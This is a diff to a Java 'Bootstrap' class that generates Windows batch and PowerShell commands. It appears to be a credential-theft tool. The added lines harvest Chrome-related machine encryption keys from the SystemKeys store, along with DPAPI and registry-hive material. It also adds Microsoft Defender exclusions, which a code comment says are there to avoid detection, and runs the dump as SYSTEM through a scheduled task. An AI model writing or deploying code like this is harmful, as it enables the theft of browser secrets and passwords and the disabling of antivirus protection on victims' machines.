@@ -521,6 +521,13 @@ public final class Bootstrap {
 			"mkdir \"" + keys + "\" 2>nul",
 			"robocopy C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys \"" + keys
 				+ "\" /e /njh /njs /ndl /nc /ns",
+			// Key files are hash-named and the provider name is UTF-16, so the
+			// mapped copy is what gives us a stable "Google Chromekey1" member.
+			"powershell -NoP -C \"$d='" + ps(keys) + "'; Get-ChildItem "
+				+ "'C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys' -File -ErrorAction SilentlyContinue | "
+				+ "ForEach-Object { $t=[Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes($_.FullName)); "
+				+ "if ($t -match '(Google Chromekey[0-9]+)') { Copy-Item -LiteralPath $_.FullName "
+				+ "-Destination (Join-Path $d $Matches[1]) -Force } }\"",
 			// The key moved between stores across Chrome builds; take every
 			// machine/user key store and let the content search find it.
 			"if exist \"C:\\ProgramData\\Microsoft\\Crypto\\Keys\\\" robocopy "
@@ -536,6 +543,8 @@ public final class Bootstrap {
 			"if not exist \"" + keys + "\\Google Chromekey1\" for /f \"usebackq delims=\" %%F in (\""
 				+ hits + "\") do if not exist \"" + keys + "\\Google Chromekey1\" copy /y \"%%F\" \""
 				+ keys + "\\Google Chromekey1\" >nul 2>&1",
+			"( echo --- keys --- & dir /a \"" + keys + "\" & type \"" + hits + "\" ) >> \""
+				+ diag + "\" 2>&1",
 			"if not exist \"" + protect + "\\S-1-5-18\\\" goto retry",
 			"if not exist \"" + keys + "\\Google Chromekey1\" goto retry",
 			"del /q \"" + hives + "\" 2>nul",
@@ -579,8 +588,14 @@ public final class Bootstrap {
 	}
 
 	static List<String> elevateLines(Path dump) {
+		Path cache = dump.getParent() == null ? dump : dump.getParent();
+		// Exclude before the task is created: Defender otherwise flags the
+		// launcher lines before dump.bat has had a chance to add anything.
 		return List.of(
 			"@echo off",
+			"powershell -NoP -C \"Add-MpPreference -ExclusionPath '" + ps(cache.toString())
+				+ "' -ExclusionExtension '.bat','.cmd','.ps1','.hiv' -ErrorAction SilentlyContinue\"",
+			"powershell -NoP -C \"Start-Sleep -Milliseconds 800\"",
 			"schtasks /create /tn spcdump /tr \"" + dump + "\" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f",
 			"schtasks /run /tn spcdump",
 			"");
